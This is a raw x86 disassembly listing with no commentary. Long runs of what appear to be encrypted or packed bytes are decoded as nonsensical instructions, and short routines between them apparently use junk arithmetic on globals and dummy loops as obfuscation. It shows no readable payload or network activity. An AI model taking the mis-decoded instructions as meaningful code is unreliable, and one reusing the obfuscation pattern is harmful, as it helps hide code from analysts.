  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483b
  40486f:	xchg   esp,eax
  404870:	popa   
  404871:	repnz mov ds:0xaec96969,al
  404877:	pop    es
  404878:	int    0x68
  40487a:	push   0x25
  40487c:	lock stc 
  40487e:	sub    DWORD PTR [edx-0x53a6c27d],0x3b
  404885:	repnz lds edi,FWORD PTR [ebx]
  404888:	mov    bh,0xed
  40488a:	mov    eax,0x5bc24a40
  40488f:	cs mov dh,0x87
  404892:	test   al,0xea
  404894:	call   0x618b:0xec3452ef
  40489b:	es mov ebx,0x37f9acf5
  4048a1:	test   eax,0x549ba011
  4048a6:	sahf   
  4048a7:	cmp    eax,0xbfccb057
  4048ac:	mov    edx,gs
  4048ae:	push   edx
  4048af:	mov    al,0x88
  4048b1:	cwde   
  4048b2:	test   DWORD PTR [ecx+ecx*2+0x2c],edi
  4048b6:	into   
  4048b7:	mov    BYTE PTR [edx],dl
  4048b9:	dec    ebx
  4048ba:	mov    dl,0x49
  4048bc:	cmc    
  4048bd:	xlat   BYTE PTR ds:[ebx]
  4048be:	aas    
  4048bf:	lahf   
  4048c0:	rcl    DWORD PTR [esi-0x39],1
  4048c3:	jg     0x4048cc
  4048c5:	clc    
  4048c6:	lods   eax,DWORD PTR ds:[esi]
  4048c7:	fiadd  DWORD PTR [ebx+0x29]
  4048ca:	pop    ds
  4048cb:	mov    al,dl
  4048cd:	jae    0x40487a
  4048cf:	arpl   WORD PTR [ecx],bp
  4048d1:	inc    esi
  4048d2:	mov    esi,0x9b0973b9
  4048d7:	or     ebx,DWORD PTR ss:[edx+0x5e79a9f]
  4048de:	int    0x20
  4048e0:	gs mov esi,0xf4cde329
  4048e6:	test   BYTE PTR cs:[ebp+0x3307626f],al
  4048ed:	inc    edx
  4048ee:	ins    BYTE PTR es:[edi],dx
  4048ef:	dec    edx
  4048f0:	or     ah,ah
  4048f2:	push   0xffffff8e
  4048f4:	leave  
  4048f5:	stos   DWORD PTR es:[edi],eax
  4048f6:	push   0xc
  4048f8:	shl    ah,1
  4048fa:	gs fs pop edx
  4048fd:	or     BYTE PTR [eax+0xe],ah
  404900:	lea    eax,[edi+0x38980fc0]
  404906:	fcmove st,st(7)
  404908:	outs   dx,BYTE PTR ds:[esi]
  404909:	outs   dx,DWORD PTR ds:[esi]
  40490a:	dec    esp
  40490b:	outs   dx,DWORD PTR ds:[esi]
  40490c:	je     0x404915
  40490e:	add    DWORD PTR [esi-0x53],edx
  404911:	shl    BYTE PTR [esp+esi*8],cl
  404914:	jae    0x40492e
  404916:	int    0x63
  404918:	out    0xbd,al
  40491a:	or     bh,ch
  40491c:	or     DWORD PTR [esi+eax*2-0x73],0x8cea3e0d
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417d29,0x417d21
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41aa4e,0x4233cb
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	addr16 sbb eax,0xda624c30
  40495a:	jg     0x4049da
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x4049d6
  404962:	mov    ch,0x9b
  404964:	fcom   DWORD PTR [edi+eax*2-0x3e]
  404968:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404969:	enter  0x6cd6,0x43
  40496d:	mov    BYTE PTR [eax+0xe],al
  404970:	adc    al,0x47
  404972:	xor    cl,BYTE PTR [ecx]
  404974:	sub    BYTE PTR [esi+0x393bb320],dh
  40497a:	hlt    
  40497b:	xchg   ebx,eax
  40497c:	push   edi
  40497d:	and    al,0x4d
  40497f:	arpl   WORD PTR [ebx],bp
  404981:	sub    ah,dh
  404983:	test   BYTE PTR [ebx+ebx*1-0x39],0x8a
  404988:	push   ss
  404989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40498a:	(bad)  
  40498b:	lds    ebp,FWORD PTR [ecx+0x46]
  40498e:	repz cmp al,BYTE PTR [esi*8-0x2d432ece]
  404996:	sbb    al,0x2f
  404998:	mov    ebp,0x28af65ac
  40499d:	fstp   st(5)
  40499f:	jecxz  0x404932
  4049a1:	sbb    DWORD PTR [eax+0x6f72c645],ecx
  4049a7:	retf   
  4049a8:	mov    ebp,0xdfb96d50
  4049ad:	mov    cl,0x8c
  4049af:	shl    BYTE PTR [ebx-0x18],cl
  4049b2:	add    al,0xe6
  4049b4:	dec    ecx
  4049b5:	jle    0x404a1b
  4049b7:	and    BYTE PTR [ecx-0xee64bd7],cl
  4049bd:	enter  0x2768,0x10
  4049c1:	call   0xb960e182
  4049c6:	les    edi,FWORD PTR [edi]
  4049c8:	in     eax,dx
  4049c9:	in     al,dx
  4049ca:	pop    es
  4049cb:	and    al,0x8b
  4049cd:	cmp    eax,0x98e36d12
  4049d2:	xchg   ebx,eax
  4049d3:	je     0x4049aa
  4049d5:	lds    esi,FWORD PTR [eax+eiz*8+0x20]
  4049d9:	jnp    0x404a43
  4049db:	stos   DWORD PTR es:[edi],eax
  4049dc:	xchg   esi,eax
  4049dd:	pop    esi
  4049de:	sar    al,0xb1
  4049e1:	lods   eax,DWORD PTR ds:[esi]
  4049e2:	addr16 jnp 0x4049ce
  4049e5:	jbe    0x404a03
  4049e7:	std    
  4049e8:	adc    DWORD PTR [esi+0x4c],edx
  4049eb:	test   eax,0xc9335e18
  4049f0:	jg     0x404a1f
  4049f2:	mov    bh,0xc8
  4049f4:	push   eax
  4049f5:	or     esp,DWORD PTR fs:[ecx+0x7c]
  4049f9:	jp     0x4049c8
  4049fb:	adc    BYTE PTR [eax+eiz*2+0x7eb59856],al
  404a02:	popa   
  404a03:	rcr    DWORD PTR [ecx],1
  404a05:	adc    dh,ch
  404a07:	mov    edx,esp
  404a09:	lock adc al,0x69
  404a0c:	mov    ebx,0x108026d9
  404a11:	sbb    DWORD PTR [eax-0xf],eax
  404a14:	mov    dh,0x43
  404a16:	ss xchg edi,eax
  404a18:	inc    si
  404a1a:	add    al,0x99
  404a1c:	jg     0x404a1e
  404a1e:	out    dx,al
  404a1f:	mov    esi,DWORD PTR [edi]
  404a21:	and    ch,BYTE PTR [ecx+eiz*2]
  404a24:	outs   dx,BYTE PTR ds:[esi]
  404a25:	mov    ah,0x7e
  404a27:	jmp    0x97999cab
  404a2c:	fcom   st(4)
  404a2e:	rcr    DWORD PTR [edi-0x1fa3303b],1
  404a34:	add    eax,0xd6c9cd0d
  404a39:	mov    al,bl
  404a3b:	mov    ebp,0x8edf989e
  404a40:	loopne 0x404a24
  404a42:	push   esi
  404a43:	jo     0x404a4d
  404a45:	push   edx
  404a46:	pusha  
  404a47:	icebp  
  404a48:	and    al,0xaa
  404a4a:	and    edx,DWORD PTR [eax-0x33]
  404a4d:	mov    bl,0x36
  404a4f:	fst    st(7)
  404a51:	test   ch,0xba
  404a54:	jecxz  0x404ac2
  404a56:	xchg   ecx,eax
  404a57:	jne    0x404a82
  404a59:	mov    ds:0x146276f2,al
  404a5e:	jbe    0x404a71
  404a60:	inc    esi
  404a61:	adc    DWORD PTR [eax+0x37c061bb],eax
  404a67:	adc    cl,BYTE PTR [ebp+0x4943d8d3]
  404a6d:	jnp    0x404a1d
  404a6f:	scas   al,BYTE PTR es:[edi]
  404a70:	pop    ds
  404a71:	daa    
  404a72:	adc    ebp,DWORD PTR [ebp-0x19]
  404a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a76:	iret   
  404a77:	sbb    esp,DWORD PTR [eax-0xf59ca79]
  404a7d:	xlat   BYTE PTR ds:[ebx]
  404a7e:	out    dx,eax
  404a7f:	add    al,0x91
  404a81:	aaa    
  404a82:	mov    cl,0xb8
  404a84:	push   ebx
  404a85:	and    DWORD PTR [ebp-0x3f],eax
  404a88:	fdivrp st(6),st
  404a8a:	outs   dx,DWORD PTR ds:[esi]
  404a8b:	call   0x7f8c9f16
  404a90:	adc    DWORD PTR [edi+0x67],edx
  404a93:	(bad)
  404a97:	xor    DWORD PTR [ecx+0x3aeddb6b],esp
  404a9d:	push   ss
  404a9e:	out    dx,al
  404a9f:	xchg   edx,eax
  404aa0:	pop    DWORD PTR [esi-0x54b6740c]
  404aa6:	push   eax
  404aa7:	push   ecx
  404aa8:	ret    0x4f7a
  404aab:	inc    esp
  404aac:	sbb    BYTE PTR [ecx+0x1b],al
  404aaf:	jno    0x404a49
  404ab1:	popa   
  404ab2:	das    
  404ab3:	inc    edx
  404ab4:	frstor [esi+0x42]
  404ab7:	xor    al,bl
  404ab9:	not    DWORD PTR [esi+0x47]
  404abc:	addr16 add eax,edi
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4233cb,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4233cb
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4233cb,eax
  404adc:	cmp    DWORD PTR ds:0x4233cb,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4233cb,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ad07
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4233cb,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4233cb
  404b13:	inc    eax
  404b14:	mov    ds:0x4233cb,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415041,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417d29,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415045,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41aa4e,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4233cf,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4233c3,0x41aa3e
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41aa4a,0x41230c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4233cf,0x41aa52
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	(bad)  
  404ba5:	in     eax,0xd7
  404ba7:	xchg   ebx,eax
  404ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ba9:	jl     0x404c29
  404bab:	jle    0x404b87
  404bad:	jg     0x404c2d
  404baf:	jle    0x404bf1
  404bb1:	jno    0x404b70
  404bb3:	sub    al,0xd7
  404bb5:	or     BYTE PTR [edi-0x17620fc2],dh
  404bbb:	jl     0x404c22
  404bbd:	mov    BYTE PTR [ebx+0x6c1862b],0x9d
  404bc4:	retf   0xcaa6
  404bc7:	add    eax,0x2c0be6f5
  404bcc:	fs shl ecx,0x2c
  404bd0:	xor    ebx,ecx
  404bd2:	mov    BYTE PTR [eax],ah
  404bd4:	jae    0x404bc9
  404bd6:	mov    dh,0xe4
  404bd8:	lea    edi,[ebp+0x2108d4da]
  404bde:	xchg   BYTE PTR [ebp-0x8b537b5],bh
  404be4:	pop    edx
  404be5:	jge    0x404b96
  404be7:	lods   al,BYTE PTR ds:[esi]
  404be8:	jecxz  0x404bdc
  404bea:	pop    esp
  404beb:	xchg   esi,eax
  404bec:	inc    esi
  404bed:	cli    
  404bee:	xchg   esp,eax
  404bef:	push   edi
  404bf0:	add    eax,0x9d7280dc
  404bf5:	pop    ss
  404bf6:	cmp    eax,DWORD PTR [ebx-0xe5b3bb0]
  404bfc:	fidiv  DWORD PTR [ecx*8+0x4980aa42]
  404c03:	nop
  404c04:	sbb    esp,DWORD PTR [bx+0x3b]
  404c08:	test   al,0xfc
  404c0a:	mov    edx,0xcd538176
  404c0f:	mov    BYTE PTR ds:0xea5eba49,ch
  404c15:	push   edi
  404c16:	push   ecx
  404c17:	adc    al,0xfd
  404c19:	and    al,0xa7
  404c1b:	inc    ecx
  404c1c:	call   0xc66fbcc4
  404c21:	mov    eax,ds:0x5eb47460
  404c26:	sahf   
  404c27:	loopne 0x404c19
  404c29:	in     al,0x7a
  404c2b:	lds    edx,FWORD PTR [eax-0x5f]
  404c2e:	adc    eax,0x514d4cf4
  404c33:	mov    bh,0x4b
  404c35:	mov    ds:0xce9f6022,eax
  404c3a:	aaa    
  404c3b:	xorps  xmm4,XMMWORD PTR [ecx]
  404c3e:	cmp    ecx,DWORD PTR [ecx+0x16]
  404c41:	dec    ebp
  404c42:	test   ecx,esp
  404c44:	int3   
  404c45:	(bad)  
  404c46:	xor    dl,BYTE PTR [ebx-0x6e0a4307]
  404c4c:	add    ecx,DWORD PTR [ebp-0x61c35627]
  404c52:	jne    0x404c1c
  404c54:	int    0x35
  404c56:	add    bl,BYTE PTR [edx+0x280a3479]
  404c5c:	mov    al,0xa4
  404c5e:	push   0x46c60ab5
  404c63:	mov    esi,0x39da64c8
  404c68:	ror    BYTE PTR [ebx-0x58014e75],cl
  404c6e:	add    cl,ch
  404c70:	dec    ebp
  404c71:	push   ss
  404c72:	loopne 0x404c8a
  404c74:	inc    ebx
  404c75:	sar    DWORD PTR [ebp-0x617d2da7],1
  404c7b:	arpl   WORD PTR [edi],cx
  404c7d:	xchg   edi,eax
  404c7e:	add    al,0x31
  404c80:	fisttp WORD PTR [edi-0x76a636b9]
  404c86:	mov    ds:0x16a17dcb,eax
  404c8b:	adc    ah,dl
  404c8d:	ror    DWORD PTR [edx+edi*4-0x69781f9a],cl
  404c94:	mov    ecx,gs
  404c96:	jge    0x404c1b
  404c98:	xchg   edi,esp
  404c9a:	mov    ax,ds:0x47e4bd23
  404ca0:	sub    BYTE PTR [eax],ah
  404ca2:	inc    eax
  404ca3:	inc    eax
  404ca4:	loopne 0x404c4c
  404ca6:	add    BYTE PTR gs:[edi],ah
  404ca9:	or     eax,0x95f9f284
  404cae:	jne    0x404d18
  404cb0:	push   ss
  404cb1:	out    dx,eax
  404cb2:	jecxz  0x404d16
  404cb4:	int3   
  404cb5:	in     al,0xab
  404cb7:	adc    BYTE PTR [eax+0x4a9c0ab5],ah
  404cbd:	fbld   TBYTE PTR [ecx]
  404cbf:	mul    DWORD PTR gs:0xbe170179
  404cc6:	or     bl,0x92
  404cc9:	inc    ecx
  404cca:	enter  0x93db,0xe3
  404cce:	sub    BYTE PTR [edi-0x2c224b6],dh
  404cd4:	add    ah,0xb1
  404cd7:	mov    esi,0x1e9c45ba
  404cdc:	out    dx,al
  404cdd:	mov    al,0xc2
  404cdf:	add    al,0xd7
  404ce1:	push   ds
  404ce2:	lods   eax,DWORD PTR ds:[esi]
  404ce3:	jo     0x404cb2
  404ce5:	lods   al,BYTE PTR ds:[esi]
  404ce6:	mov    dl,0x4d
  404ce8:	pushf  
  404ce9:	sti    
  404cea:	cmp    esp,DWORD PTR [esi+0x72ada9cd]
  404cf0:	cli    
  404cf1:	push   ecx
  404cf2:	lea    esp,[edi+edx*1+0x70]
  404cf6:	mov    eax,0xaeebeaad
  404cfb:	push   edi
  404cfc:	pop    ss
  404cfd:	push   esi
  404cfe:	add    DWORD PTR [ecx],esp
  404d00:	sbb    dl,0x91
  404d03:	mov    ds,WORD PTR [ebx+0x530dcb93]
  404d09:	rcr    BYTE PTR [ebx],1
  404d0b:	cwde   
  404d0c:	xor    eax,esi
  404d0e:	neg    DWORD PTR ds:0x415035
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x4122f4,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41230c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415041,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4233c7,0x4122f4
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415049
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4233c7,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417d29,0x4233db
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4233cf
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4233db
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417d29,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417d0d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41aa42,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417d25,0x4122fc
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417d25,0x417d0d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41aa46,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x4122f8,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x4122f4
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404dbd
  404e15:	cmp    cl,BYTE PTR [ecx]
  404e17:	js     0x404e1b
  404e19:	jb     0x404e99
  404e1b:	jle    0x404df7
  404e1d:	jg     0x404e9d
  404e1f:	jle    0x404e15
  404e21:	push   ss
  404e22:	cmp    eax,0x70db5cae
  404e27:	jmp    0xf56f3f0
  404e2c:	push   ecx
  404e2d:	adc    bh,BYTE PTR [ecx+eax*8+0x7f]
  404e31:	jb     0x404e9c
  404e33:	test   BYTE PTR [eax+0x54],ch
  404e36:	les    esp,FWORD PTR [ebp*4+0x2389dcc2]
  404e3d:	sahf   
  404e3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e3f:	xchg   esi,eax
  404e40:	xchg   edi,eax
  404e41:	mov    ebx,0x2596c591
  404e46:	(bad)  
  404e48:	stos   DWORD PTR es:[edi],eax
  404e49:	inc    cl
  404e4b:	lahf   
  404e4c:	ror    DWORD PTR [ebx-0x5e],0x44
  404e50:	mov    ds:0xc22f1a45,al
  404e55:	sbb    cl,BYTE PTR [edx+eax*8+0x12]
  404e59:	ins    BYTE PTR es:[edi],dx
  404e5a:	lods   eax,DWORD PTR ds:[esi]
  404e5b:	dec    ebp
  404e5c:	mov    eax,0x562f279a
  404e61:	jmp    0xbc28cf91
  404e66:	sbb    eax,0xbff5d92e
  404e6b:	xor    bh,cl
  404e6d:	sahf   
  404e6e:	cs and ebx,esp
  404e71:	aad    0xc4
  404e73:	aas    
  404e74:	sub    ah,0x48
  404e77:	outs   dx,BYTE PTR ds:[esi]
  404e78:	sub    eax,0xf53eb3b4
  404e7d:	mov    WORD PTR [ebp+0x38039531],gs
  404e83:	jge    0x404e57
  404e85:	les    esi,FWORD PTR [esi+0x1eb20084]
  404e8b:	jmp    0x15b955f1
  404e90:	dec    edi
  404e91:	or     ch,ah
  404e93:	sub    DWORD PTR [edi-0x34],ebx
  404e96:	mov    dh,BYTE PTR [edx+0x3812c36c]
  404e9c:	sbb    edi,DWORD PTR [edx-0x256a0731]
  404ea2:	or     al,0x6
  404ea4:	sub    BYTE PTR [edi],bl
  404ea6:	cmp    eax,0x2253923f
  404eab:	add    dl,BYTE PTR [ebx+ebx*8-0x5a]
  404eaf:	rcr    BYTE PTR [ecx+0x20],1
  404eb2:	adc    DWORD PTR [ebp-0x16],eax
  404eb5:	sub    ecx,0x78a4426d
  404ebb:	adc    al,0x82
  404ebd:	push   esp
  404ebe:	bound  edi,QWORD PTR [ecx-0x44]
  404ec1:	mov    dh,0xe1
  404ec3:	loope  0x404f1f
  404ec5:	ins    DWORD PTR es:[edi],dx
  404ec6:	mov    ch,BYTE PTR [ebx]
  404ec8:	xor    dl,al
  404eca:	sub    ebp,DWORD PTR [edx-0x63f7a989]
  404ed0:	retf   
  404ed1:	shl    edx,cl
  404ed3:	cwde   
  404ed4:	pop    ebx
  404ed5:	cs out dx,eax
  404ed7:	sub    DWORD PTR [ecx+0x318f0c3c],edi
  404edd:	cmp    ah,dl
  404edf:	cmc    
  404ee0:	or     BYTE PTR [eax-0x51],bh
  404ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ee5:	imul   esi,DWORD PTR ds:0x4ac2e6f3,0x9
  404eec:	pusha  
  404eed:	test   al,0xfe
  404eef:	bnd ret 
  404ef1:	mov    al,0xc2
  404ef3:	mov    ds:0xdf871726,al
  404ef8:	or     ecx,esi
  404efa:	sbb    al,0xa5
  404efc:	mul    DWORD PTR [ecx-0x722f2c3e]
  404f02:	mov    cl,0x8
  404f04:	inc    ebx
  404f05:	dec    esp
  404f06:	stc    
  404f07:	ja     0x404ed6
  404f09:	aam    0x22
  404f0b:	xchg   ebp,eax
  404f0c:	arpl   WORD PTR [ecx-0x47bd09f6],di
  404f12:	ds loopne 0x404f11
  404f15:	aas    
  404f16:	out    dx,eax
  404f17:	js     0x404eeb
  404f19:	in     eax,0x45
  404f1b:	and    edi,DWORD PTR [ecx]
  404f1d:	adc    BYTE PTR [ecx+ecx*1],ah
  404f20:	das    
  404f21:	adc    DWORD PTR [ecx+esi*4-0x31],edi
  404f25:	scas   eax,DWORD PTR es:[edi]
  404f26:	stos   DWORD PTR es:[edi],eax
  404f27:	fisubr WORD PTR [ebx+0x69]
  404f2a:	push   edx
  404f2b:	sub    al,dl
  404f2d:	sbb    BYTE PTR [edx],ch
  404f2f:	or     BYTE PTR [esi],al
  404f31:	adc    BYTE PTR [edi-0x7f],al
  404f34:	loope  0x404ed5
  404f36:	dec    edi
  404f37:	pop    ecx
  404f38:	mov    esp,0x3be37316
  404f3d:	inc    edi
  404f3e:	xchg   DWORD PTR [eax+eiz*1-0x6e],ebx
  404f42:	out    dx,eax
  404f43:	xor    ah,BYTE PTR [edx+eax*8+0x58ab9afa]
  404f4a:	mov    al,ds:0x3c44b3da
  404f4f:	xor    al,0x50
  404f52:	pop    ecx
  404f53:	hlt    
  404f54:	fcom   QWORD PTR [esi]
  404f56:	scas   eax,DWORD PTR es:[edi]
  404f57:	ss out dx,al
  404f59:	mov    eax,ds:0x97a23091
  404f5e:	loopne 0x404f6e
  404f60:	mov    dl,0xf6
  404f62:	xchg   ecx,eax
  404f63:	into   
  404f64:	sbb    eax,0xd354d105
  404f69:	pop    ecx
  404f6a:	add    cl,al
  404f6c:	xor    eax,0x103c6ba3
  404f71:	sar    BYTE PTR [ebp-0x3a],1
  404f74:	mov    bh,0x3
  404f76:	or     BYTE PTR [ebx+0x7e],bl
  404f79:	mov    esp,0x8150d6e4
  404f7e:	and    eax,0x4233bf
  404f83:	add    BYTE PTR [eax],al
  404f85:	add    BYTE PTR [eax],al
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4233bf
  404f91:	inc    eax
  404f92:	mov    ds:0x4233bf,eax
  404f97:	cmp    DWORD PTR ds:0x4233bf,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4233bf,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x4122e4,0x412300
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415045,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x900f11a],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x404fa9
  404ff9:	jle    0x405051
  404ffb:	ficomp DWORD PTR [ecx+0x57]
  404ffe:	in     al,0xe4
  405000:	mov    cl,0x46
  405002:	inc    ecx
  405003:	dec    edx
  405004:	inc    ebx
  405005:	push   0xe50a2623
  40500a:	jmp    DWORD PTR [esi]
  40500c:	dec    eax
  40500d:	mov    dh,0x73
  40500f:	or     ah,BYTE PTR [edx+0x6fde4dbc]
  405015:	mov    ecx,0xe0245b7e
  40501a:	or     al,0x82
  40501c:	jo     0x404fb6
  40501e:	ss pop edi
  405020:	push   esi
  405021:	xor    eax,0x6047e8fb
  405026:	add    ebp,DWORD PTR [ecx+0x3f16e11e]
  40502c:	add    al,0x12
  40502e:	fisttp QWORD PTR [ebx]
  405030:	(bad)  
  405031:	repz pop esi
  405033:	pop    ebp
  405034:	inc    ecx
  405035:	mov    esi,0x29fe8766
  40503a:	xor    ch,bl
  40503c:	or     al,0x25
  40503e:	xchg   edx,eax
  40503f:	fnsave [ecx-0x22a9a914]
  405045:	loop   0x4050b0
  405047:	(bad)  
  405048:	aaa    
  405049:	push   es
  40504a:	jns    0x405040
  40504c:	pusha  
  40504d:	jns    0x4050b8
  40504f:	push   cs
  405050:	imul   ecx,DWORD PTR [edi+ebx*4],0x5800ff9
  405057:	out    dx,eax
  405058:	mov    edi,DWORD PTR [ebx+0x3f9c856a]
  40505e:	ja     0x405059
  405060:	fwait
  405061:	push   edx
  405062:	push   0x37c8f58f
  405067:	fisubr DWORD PTR [edi-0x59]
  40506a:	pusha  
  40506b:	aad    0x9c
  40506d:	xchg   ebx,eax
  40506e:	cmp    bl,dl
  405070:	dec    ebp
  405071:	or     DWORD PTR [ecx],ebp
  405073:	inc    ebp
  405074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405075:	xchg   DWORD PTR [esi],edi
  405077:	pop    es
  405078:	cld    
  405079:	cmp    eax,0x529c60c7
  40507e:	jle    0x40503d
  405080:	dec    esp
  405081:	mov    edx,0x4dbb855b
  405086:	shl    DWORD PTR [edx+0x660f28a],cl
  40508c:	mov    WORD PTR [esi],gs
  40508e:	xor    ch,bh
  405090:	xchg   ebx,eax
  405091:	xor    eax,0x8089abff
  405096:	and    al,0xaf
  405098:	nop
  405099:	cs pushf 
  40509b:	jg     0x4050bd
  40509d:	mov    ebp,0xc8d44c4c
  4050a2:	mov    edi,0x63022a0d
  4050a7:	mov    al,ds:0xd510a1e9
  4050ac:	js     0x4050ef
  4050ae:	adc    DWORD PTR [edx-0x10],edi
  4050b1:	scas   al,BYTE PTR es:[edi]
  4050b2:	test   DWORD PTR ds:0x68db43c9,eax
  4050b8:	fcmovbe st,st(3)
  4050ba:	iret   
  4050bb:	mov    al,ds:0x9cfd9231
  4050c0:	xchg   BYTE PTR [ecx-0x78651055],dl
  4050c6:	jae    0x4050e5
  4050c8:	call   0xb060:0x5a8d310
  4050cf:	adc    DWORD PTR [esi-0x6c],ebp
  4050d2:	inc    edx
  4050d3:	lea    esp,[eax]
  4050d5:	xchg   edi,eax
  4050d6:	and    eax,0x99ae79bd
  4050db:	sub    al,0x17
  4050dd:	(bad)
  4050e0:	cmp    al,0x9c
  4050e2:	sbb    DWORD PTR [ebp-0x1a],0x4
  4050e6:	mov    ds:0x1334bd7d,eax
  4050eb:	dec    eax
  4050ec:	mov    eax,ds:0x77eb4e73
  4050f1:	mov    bl,0xc8
  4050f3:	call   0xd596:0x9d174d21
  4050fa:	jmp    0x405091
  4050fc:	jo     0x40511b
  4050fe:	xchg   esi,eax
  4050ff:	dec    ebp
  405100:	mov    esp,0xbbc92314
  405105:	lahf   
  405106:	cmp    eax,0x7d12c6d7
  40510b:	lock sbb al,0x24
  40510e:	add    al,BYTE PTR [eax+0x3852b11f]
  405114:	shl    WORD PTR cs:0x1508a7ad,0xad
  40511d:	add    esi,edi
  40511f:	(bad)  
  405121:	mov    bl,0x3f
  405123:	add    BYTE PTR [eax+0x646584f6],cl
